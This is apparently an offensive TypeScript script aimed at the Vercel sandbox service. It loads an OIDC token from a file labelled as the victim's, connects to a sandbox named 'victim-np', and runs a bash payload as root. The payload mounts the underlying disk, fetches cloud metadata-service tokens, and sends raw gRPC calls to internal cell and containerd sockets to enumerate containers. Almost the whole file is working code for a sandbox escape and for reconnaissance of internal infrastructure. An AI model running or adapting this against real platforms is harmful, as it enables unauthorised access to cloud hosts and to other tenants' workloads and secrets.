import { Sandbox } from "@vercel/sandbox";
import { readFileSync } from "fs";
function loadEnv(file: string): Record<string, string> {
  const out: Record<string, string> = {};
  for (const line of readFileSync(file, "utf8").split("\n")) {
    const m = line.match(/^([A-Z_]+)=(.*)$/);
    if (m) out[m[1]] = m[2].trim();
  }
  return out;
}
const VICTIM = loadEnv("/tmp/vercel-sandbox/victima/.env.local").VERCEL_OIDC_TOKEN!;
const V = JSON.parse(Buffer.from(VICTIM.split(".")[1], "base64url").toString());

const EXPLORE = `#!/bin/bash
set +e
mkdir -p /mnt/vda2
mount -t xfs /dev/vda /mnt/vda2 2>/dev/null
R=/mnt/vda2
printf '\\x00\\x00\\x00\\x00\\x00' > /tmp/empty.msg
echo "===== MMDS token flow (IMDS v2) ====="
TOK=$(curl -s --max-time 3 -X PUT "http://169.254.169.254/latest/api/token" -H "X-metadata-token-ttl-seconds: 60" 2>&1)
echo "token rc=$? first60=$(echo "$TOK" | cut -c1-60)"
echo "--- MMDS root with token ---"
curl -s --max-time 3 "http://169.254.169.254" -H "Accept: application/json" -H "X-metadata-token: $TOK" 2>&1 | head -c 500
echo
echo "--- MMDS latest/meta-data ---"
curl -s --max-time 3 "http://169.254.169.254/latest/meta-data" -H "X-metadata-token: $TOK" 2>&1 | head -c 300
echo
echo "===== gRPC on cell.sock with errors (h2c prior) ====="
timeout 6 curl -sv --http2-prior-knowledge --unix-socket $R/run/cell/cell.sock -X POST "http://unix/vercel.hive.celld.api.v1.CelldService/RegisterPort" -H 'Content-Type: application/grpc' -H 'TE: trailers' -H 'Content-Length: 5' --data-binary @/tmp/empty.msg 2>&1 | head -30
echo
echo "===== gRPC on 30002 with errors ====="
timeout 6 curl -sv --http2-prior-knowledge -X POST "http://127.0.0.1:30002/vercel.hive.celld.api.v1.CelldService/RegisterPort" -H 'Content-Type: application/grpc' -H 'TE: trailers' -H 'Content-Length: 5' --data-binary @/tmp/empty.msg 2>&1 | head -30
echo
echo "===== gRPC on 23456/30001 with errors ====="
for port in 23456 30001; do
  echo "--- :$port ---"
  timeout 6 curl -sv --http2-prior-knowledge -X POST "http://127.0.0.1:$port/vercel.hive.celld.api.v1.CelldService/RegisterPort" -H 'Content-Type: application/grpc' -H 'TE: trailers' -H 'Content-Length: 5' --data-binary @/tmp/empty.msg 2>&1 | grep -aE "HTTP/|grpc-status|grpc-message|error|404|Refused|Reset" | head -8
done
echo
echo "===== full containerd container get ====="
timeout 8 curl -s --http2-prior-knowledge --unix-socket $R/run/containerd/containerd.sock \
  -H 'Content-Type: application/grpc' -H 'TE: trailers' -H 'Content-Length: 5' \
  -H 'containerd-namespace: default' --data-binary @/tmp/empty.msg \
  -o /tmp/ctr.body "http://unix/containerd.services.containers.v1.Containers/List" 2>&1
ls -la /tmp/ctr.body 2>&1
strings -a -n 4 /tmp/ctr.body 2>/dev/null | head -60
echo DONE`;

const SCRIPT = `set +e
cat > /tmp/explore13.sh <<'EXPLORE_EOF'
${EXPLORE}
EXPLORE_EOF
sudo unshare -m --propagation private bash /tmp/explore13.sh 2>&1
echo "=== rc: $? ==="
`;

async function main() {
  const sbx = await Sandbox.get({ name: "victim-np", token: VICTIM, teamId: V.owner_id, projectId: V.project_id });
  const res = await sbx.runCommand("bash", ["-c", SCRIPT], { sudo: true, wait: true, timeout: 180_000 });
  console.log("exit:", res.exitCode);
  console.log(await res.output("both"));
}
main().catch((e) => { console.error("ERR", e.message); process.exit(1); });